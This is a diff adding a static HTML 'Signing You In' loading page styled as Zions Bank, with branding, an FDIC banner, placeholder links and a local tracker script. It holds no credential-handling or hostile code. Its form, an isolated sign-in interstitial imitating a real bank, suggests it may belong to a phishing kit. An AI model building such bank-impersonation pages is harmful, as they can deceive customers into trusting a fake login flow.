@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading | Zions Bank</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      background-color: #003b5c;
+      padding: 0;
+    }
+
+    .header__top {
+      background-color: #002a42;
+      padding: 6px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #fff;
+    }
+
+    .header__top-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .header__top-left img {
+      height: 18px;
+    }
+
+    .header__top-right {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+
+    .header__top-right a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 12px;
+    }
+
+    .header__main {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 20px;
+    }
+
+    .header__logo {
+      display: flex;
+      align-items: center;
+      gap: 30px;
+    }
+
+    .header__logo-text {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+    }
+
+    .header__nav {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .header__nav-item {
+      color: #fff;
+      text-decoration: none;
+      font-size: 14px;
+      padding: 4px 8px;
+      font-weight: 600;
+    }
+
+    .header__nav-item--active {
+      border-bottom: 3px solid #4a8c2a;
+    }
+
+    .header__right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .header__right a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 15px;
+    }
+
+    .loading-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 20px;
+    }
+
+    .loading-box {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
+      padding: 50px 60px;
+      text-align: center;
+      max-width: 480px;
+      width: 100%;
+    }
+
+    .loading-box__title {
+      color: #003b5c;
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .loading-box__subtitle {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #e0e0e0;
+      border-top-color: #003b5c;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 24px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loading-box__status {
+      color: #003b5c;
+      font-size: 15px;
+      font-weight: 500;
+    }
+
+    .loading-dots::after {
+      content: '';
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0% { content: ''; }
+      25% { content: '.'; }
+      50% { content: '..'; }
+      75% { content: '...'; }
+    }
+
+    .footer {
+      background-color: #003b5c;
+      color: #fff;
+      padding: 30px 20px;
+      text-align: center;
+    }
+
+    .footer__links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+
+    .footer__links a {
+      color: #b0c9d9;
+      text-decoration: none;
+      font-size: 13px;
+    }
+
+    .footer__copy {
+      font-size: 12px;
+      color: #7a9eb5;
+    }
+
+    .footer__fdic {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 12px;
+      font-size: 11px;
+      color: #7a9eb5;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: #e0e0e0;
+      border-radius: 2px;
+      margin-top: 20px;
+      overflow: hidden;
+    }
+
+    .progress-bar__fill {
+      height: 100%;
+      background: linear-gradient(90deg, #003b5c, #4a8c2a);
+      border-radius: 2px;
+      animation: progress 3s ease-in-out forwards;
+    }
+
+    @keyframes progress {
+      0% { width: 0%; }
+      30% { width: 40%; }
+      60% { width: 70%; }
+      80% { width: 85%; }
+      100% { width: 100%; }
+    }
+  </style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+
+  <header class="header">
+    <div class="header__top">
+      <div class="header__top-left">
+        <span style="font-weight:700; font-size:13px;">FDIC</span>
+        <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+      <div class="header__top-right">
+        <a href="#">About</a>
+        <a href="#">Locations</a>
+        <a href="#">Customer Service</a>
+      </div>
+    </div>
+    <div class="header__main">
+      <div class="header__logo">
+        <span class="header__logo-text">ZIONS BANK</span>
+        <nav class="header__nav">
+          <a href="#" class="header__nav-item">PERSONAL</a>
+          <a href="#" class="header__nav-item header__nav-item--active">BUSINESS</a>
+          <a href="#" class="header__nav-item">WEALTH</a>
+        </nav>
+      </div>
+      <div class="header__right">
+        <a href="#">Products</a>
+        <a href="#">Services</a>
+        <a href="#">Community</a>
+      </div>
+    </div>
+  </header>
+
+  <div class="loading-container">
+    <div class="loading-box">
+      <div class="spinner"></div>
+      <h1 class="loading-box__title">Signing You In</h1>
+      <p class="loading-box__subtitle">Please wait while we securely connect you to your account.</p>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="footer__links">
+      <a href="#">Privacy</a>
+      <a href="#">Security</a>
+      <a href="#">Accessibility</a>
+      <a href="#">Terms of Use</a>
+      <a href="#">Contact Us</a>
+    </div>
+    <p class="footer__copy">&copy; Zions Bancorporation, N.A. All rights reserved.</p>
+    <div class="footer__fdic">
+      <span style="font-weight:700;">FDIC</span>
+      <span>Member FDIC. Equal Housing Lender.</span>
+    </div>
+  </footer>
+
+</body>
+</html>
